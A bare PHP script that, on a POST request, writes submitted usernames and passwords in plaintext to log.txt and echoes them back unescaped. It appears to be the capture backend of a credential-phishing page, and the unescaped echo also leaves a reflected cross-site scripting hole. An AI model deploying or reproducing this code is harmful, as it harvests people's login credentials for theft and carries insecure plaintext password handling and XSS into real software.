<?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        $file = fopen('log.txt', 'a');
        fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
        fclose($file);
        
        echo "Username: " . $username . "<br>Password: " . $password;
    } else {
        echo "No data received yet.";
    }
?>
